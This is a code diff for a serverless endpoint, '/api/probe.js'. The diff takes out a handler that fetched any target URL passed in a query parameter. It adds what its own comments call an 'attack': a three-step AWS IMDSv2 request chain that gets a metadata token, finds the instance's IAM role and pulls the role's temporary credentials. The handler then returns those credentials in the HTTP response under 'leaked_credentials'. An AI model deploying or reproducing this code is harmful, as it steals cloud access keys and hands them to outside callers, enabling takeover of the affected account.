@@ -1,8 +1,4 @@
-// /api/probe.js
-
 export default async function handler(request, response) {
-    // Get the target URL from a query parameter (e.g., /api/probe?target=http://example.com)
-    const targetUrl = request.query.target;
 
     const serverData = {
         'Timestamp': new Date().toUTCString(),
@@ -11,32 +7,62 @@ export default async function handler(request, response) {
         'HTTP_Headers': request.headers,
     };
 
-    // --- ACTIVE PROBE SECTION ---
-    if (targetUrl) {
-        serverData.ACTIVE_PROBE = {
-            'target': targetUrl,
-            'status': 'pending',
-        };
-        try {
-            // Attempt to fetch the target URL with a 3-second timeout
-            const probeResponse = await fetch(targetUrl, { 
-                signal: AbortSignal.timeout(3000) 
-            });
+    // ========================================================================
+    // --- ADVANCED IMDSv2 BYPASS PROBE ---
+    // This is the primary attack now. We will try the full IMDSv2 flow.
+    // ========================================================================
+    serverData.IMDSv2_PROBE = { status: 'pending' };
 
-            // If successful, record the status and headers
-            serverData.ACTIVE_PROBE.status = 'success';
-            serverData.ACTIVE_PROBE.response_status_code = probeResponse.status;
-            serverData.ACTIVE_PROBE.response_headers = Object.fromEntries(probeResponse.headers.entries());
-            // Optional: Try to get the first 500 chars of the body
-            // serverData.ACTIVE_PROBE.response_body_preview = (await probeResponse.text()).substring(0, 500);
+    try {
+        // STEP 1: Fetch the session token using a PUT request.
+        const tokenResponse = await fetch('http://169.254.169.254/latest/api/token', {
+            method: 'PUT',
+            headers: {
+                'X-aws-ec2-metadata-token-ttl-seconds': '21600', // Request a token valid for 6 hours
+            },
+            signal: AbortSignal.timeout(2000) // 2-second timeout
+        });
 
-        } catch (error) {
-            // If it fails (e.g., timeout, connection refused), record the error
-            serverData.ACTIVE_PROBE.status = 'failed';
-            serverData.ACTIVE_PROBE.error = error.message;
+        if (!tokenResponse.ok) {
+            throw new Error(`Token request failed with status: ${tokenResponse.status}`);
         }
+        
+        const token = await tokenResponse.text();
+        serverData.IMDSv2_PROBE.token_retrieved = true;
+
+        // STEP 2: Use the token to fetch the IAM security credentials.
+        const credsResponse = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
+            method: 'GET',
+            headers: {
+                'X-aws-ec2-metadata-token': token, // Use the retrieved token
+            },
+            signal: AbortSignal.timeout(2000) // 2-second timeout
+        });
+
+        if (!credsResponse.ok) {
+            throw new Error(`Credential request failed with status: ${credsResponse.status}`);
+        }
+
+        const iamRoleName = await credsResponse.text();
+        serverData.IMDSv2_PROBE.status = 'SUCCESS - IAM Role Found!';
+        serverData.IMDSv2_PROBE.iam_role_name = iamRoleName;
+
+        // BONUS STEP 3: If we found a role, let's get the actual credentials.
+        const finalCredsResponse = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${iamRoleName}`, {
+            method: 'GET',
+            headers: { 'X-aws-ec2-metadata-token': token },
+            signal: AbortSignal.timeout(2000)
+        });
+
+        const finalCreds = await finalCredsResponse.json();
+        serverData.IMDSv2_PROBE.leaked_credentials = finalCreds;
+
+
+    } catch (error) {
+        serverData.IMDSv2_PROBE.status = 'failed';
+        serverData.IMDSv2_PROBE.error = error.message;
     }
-    
+
     // Final response
     response.status(200).json(serverData);
 }
